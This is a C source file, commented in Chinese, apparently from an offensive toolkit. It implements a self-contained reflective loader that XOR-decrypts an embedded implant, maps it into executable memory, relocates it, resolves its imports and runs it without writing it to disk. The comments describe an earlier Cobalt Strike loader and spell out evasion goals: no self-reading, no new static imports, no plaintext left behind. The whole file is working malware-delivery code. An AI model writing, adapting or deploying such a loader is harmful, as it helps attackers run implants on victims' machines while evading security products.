/*
 * csdev :: udrl2.c  --  自研反射加载器 (协议 v2 载荷的内存加载器)
 * ==========================================================================
 * 与 kits/udrl/udrl.c 的区别:
 *   旧版是为 **Cobalt Strike 的 UDRL ABI** 写的 (被 CS 的 stage 调用),
 *   只在 CS 那条路径上可用。本文件是**自包含**的内存加载器: 内嵌一份加密的
 *   v2 植入体 PE, 运行时解密 + 镜像映射 + 重定位 + 导入解析 + 调入口,
 *   全程不落盘。
 *
 * 用途: 需要"载荷不以 PE 形式落地"时用它当外壳; 生成器 win2-udrl 会自动
 *       编译植入体 → XOR 加密 → 转 C 数组 → 编进本加载器。
 *
 * 与旧版一致的三条原则:
 *   1. **不读自身文件**: 载荷在编译期以数组形式内嵌, 避免
 *      自读取行为链 (GetModuleFileName/CreateFile/ReadFile 全是检测点)。
 *   2. **不新增静态导入**: 只用 KERNEL32 的 VirtualAlloc / LoadLibraryA /
 *      GetProcAddress。
 *   3. **不留明文**: 内嵌数据是 XOR 掩码态, 解密在映射前完成, 映射后立即抹掉原缓冲。
 * ==========================================================================
 */
#include <windows.h>

/* 生成器写入: const unsigned char PAYLOAD_BLOB[]; const unsigned int PAYLOAD_LEN; */
#include "payload_blob.h"

#define UDRL_MASK 0x5A

/* 调试输出 (-DUDRL_DEBUG=1 时写 C:\udrl_debug.log) */
#ifdef UDRL_DEBUG
static unsigned int u_strlen(const char *s) { unsigned int n = 0; while (s[n]) n++; return n; }
static void udbg(const char *s)
{
    HANDLE h = CreateFileA("C:\\udrl_debug.log", FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        SetFilePointer(h, 0, NULL, FILE_END);
        WriteFile(h, s, (DWORD)u_strlen(s), &w, NULL);
        CloseHandle(h);
    }
}
static void udbgn(const char *tag, unsigned long long v)
{
    char buf[80];
    unsigned int k = 0, i;
    char t[24];
    int m = 0;
    while (tag[k] && k < 40) { buf[k] = tag[k]; k++; }
    if (v == 0) t[m++] = '0';
    while (v) { t[m++] = (char)('0' + (v % 10)); v /= 10; }
    for (i = 0; i < (unsigned int)m && k < 70; i++) buf[k++] = t[m - 1 - i];
    buf[k++] = '\n';
    buf[k] = 0;
    udbg(buf);
}
#else
#define udbg(s)     ((void)0)
#define udbgn(t, v) ((void)0)
#endif

static void u_memcpy(void *d, const void *s, unsigned int n)
{
    unsigned char *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
}

static void u_memset(void *d, int v, unsigned int n)
{
    unsigned char *dp = (unsigned char *)d;
    while (n--) *dp++ = (unsigned char)v;
}

/* ---------------------------------------------------------------- 映射 */

static unsigned char *u_map(const unsigned char *data, unsigned int len)
{
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_SECTION_HEADER *sec;
    unsigned char *base;
    unsigned int i;

    if (len < sizeof(IMAGE_DOS_HEADER)) return NULL;
    dos = (IMAGE_DOS_HEADER *)data;
    if (dos->e_magic != 0x5A4D) return NULL;
    if ((unsigned int)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > len) return NULL;

    nt = (IMAGE_NT_HEADERS *)(data + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return NULL;
    if (nt->FileHeader.Machine != 0x8664) return NULL;   /* 仅 x64 */
    if (nt->OptionalHeader.SizeOfImage < 4096 ||
        nt->OptionalHeader.SizeOfImage > (256u << 20)) return NULL;

    /* **必须优先按首选基址映射**。
     * MinGW 编译的 EXE 不是位置无关代码: CRT 里的 __ImageBase 是链接期立即数,
     * 若把它们映射到别的地址, CRT 初始化会按错误基址取数据并立即崩溃
     * (实测: 日志停在 "calling entry", 之后进程直接消失)。
     * 因此生成器给内层载荷指定了与加载器不同的 image-base, 这里再优先按
     * 首选基址申请; 拿不到时才回退到任意地址 (回退路径不保证可用)。 */
    base = (unsigned char *)VirtualAlloc((LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
                                         nt->OptionalHeader.SizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) {
        base = (unsigned char *)VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!base) return NULL;

    /* 头 (含节表) */
    if (nt->OptionalHeader.SizeOfHeaders > len) { VirtualFree(base, 0, MEM_RELEASE); return NULL; }
    u_memcpy(base, data, nt->OptionalHeader.SizeOfHeaders);

    /* 节 */
    sec = IMAGE_FIRST_SECTION(nt);
    if (nt->FileHeader.NumberOfSections == 0 || nt->FileHeader.NumberOfSections > 96) {
        VirtualFree(base, 0, MEM_RELEASE);
        return NULL;
    }
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        if (sec[i].PointerToRawData + sec[i].SizeOfRawData > len) continue;
        if (sec[i].VirtualAddress + sec[i].SizeOfRawData > nt->OptionalHeader.SizeOfImage) continue;
        u_memcpy(base + sec[i].VirtualAddress, data + sec[i].PointerToRawData, sec[i].SizeOfRawData);
    }

    /* 重定位 */
    {
        IMAGE_DATA_DIRECTORY *rd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        unsigned long long delta = (unsigned long long)base -
                                   (unsigned long long)nt->OptionalHeader.ImageBase;
        if (rd->Size && delta) {
            unsigned int off = 0;
            IMAGE_BASE_RELOCATION *rel = (IMAGE_BASE_RELOCATION *)(base + rd->VirtualAddress);
            while (off + sizeof(IMAGE_BASE_RELOCATION) <= rd->Size) {
                unsigned int cnt = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2u;
                unsigned short *items =
                    (unsigned short *)((unsigned char *)rel + sizeof(IMAGE_BASE_RELOCATION));
                unsigned int k;
                if (rel->SizeOfBlock == 0) break;
                for (k = 0; k < cnt; k++) {
                    unsigned int type = items[k] >> 12;
                    unsigned int rva = rel->VirtualAddress + (items[k] & 0x0FFFu);
                    if (rva + 8u > nt->OptionalHeader.SizeOfImage) continue;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(unsigned long long *)(base + rva) += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(unsigned int *)(base + rva) += (unsigned int)delta;
                    }
                    /* 其余类型 (ABSOLUTE 等) 按惯例跳过 */
                }
                off += rel->SizeOfBlock;
                rel = (IMAGE_BASE_RELOCATION *)((unsigned char *)rel + rel->SizeOfBlock);
            }
        }
    }

    /* 导入 */
    {
        IMAGE_DATA_DIRECTORY *id =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (id->Size) {
            IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + id->VirtualAddress);
            while (imp->Name) {
                HMODULE h = LoadLibraryA((const char *)(base + imp->Name));
                if (h) {
                    IMAGE_THUNK_DATA *oft = imp->OriginalFirstThunk
                        ? (IMAGE_THUNK_DATA *)(base + imp->OriginalFirstThunk) : NULL;
                    IMAGE_THUNK_DATA *ft = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);
                    if (!oft) {
                        /* 无 OriginalFirstThunk 时 FirstThunk 本身即名称表 */
                        oft = ft;
                    }
                    while (oft->u1.AddressOfData) {
                        if (oft->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                            ft->u1.Function = (unsigned long long)GetProcAddress(
                                h, (const char *)(oft->u1.Ordinal & 0xFFFFu));
                        } else {
                            IMAGE_IMPORT_BY_NAME *ib =
                                (IMAGE_IMPORT_BY_NAME *)(base + oft->u1.AddressOfData);
                            ft->u1.Function = (unsigned long long)GetProcAddress(h, ib->Name);
                        }
                        oft++;
                        ft++;
                    }
                }
                imp++;
            }
        }
    }

    return base;
}

/* ---------------------------------------------------------------- 入口 */

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    unsigned char *plain = NULL;
    unsigned char *mapped;
    unsigned int i;
    int rc = 1;

    (void)a; (void)b; (void)c; (void)d;

    udbg("--- udrl start ---\n");
    udbgn("blob_len=", (unsigned long long)PAYLOAD_LEN);

    /* 解密到独立缓冲 —— 绝不就地解密内嵌数组 (那是只读段) */
    plain = (unsigned char *)VirtualAlloc(NULL, PAYLOAD_LEN,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!plain) return 1;

    for (i = 0; i < PAYLOAD_LEN; i++) {
        plain[i] = (unsigned char)(PAYLOAD_BLOB[i] ^ UDRL_MASK);
    }
    udbg("decrypted\n");

    mapped = u_map(plain, PAYLOAD_LEN);
    udbgn("mapped=", (unsigned long long)(size_t)mapped);

    /* 无论成败, 明文缓冲立即抹掉 */
    u_memset(plain, 0, PAYLOAD_LEN);
    VirtualFree(plain, 0, MEM_RELEASE);

    if (!mapped) { udbg("map failed\n"); return 2; }

    {
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mapped;
        IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(mapped + dos->e_lfanew);
        DWORD rva = nt->OptionalHeader.AddressOfEntryPoint;
        udbgn("ep_rva=", (unsigned long long)rva);
        if (rva == 0) return 3;
        {
            /* EXE 入口 (mainCRTStartup / WinMainCRTStartup):
             * 它会走完 CRT 初始化后进入植入体主循环并长期驻留。 */
            typedef int (WINAPI *entry_t)(void);
            entry_t fn = (entry_t)(mapped + rva);
            udbg("calling entry\n");
            rc = fn();
            udbgn("entry returned=", (unsigned long long)(unsigned int)rc);
        }
    }

    return rc;
}
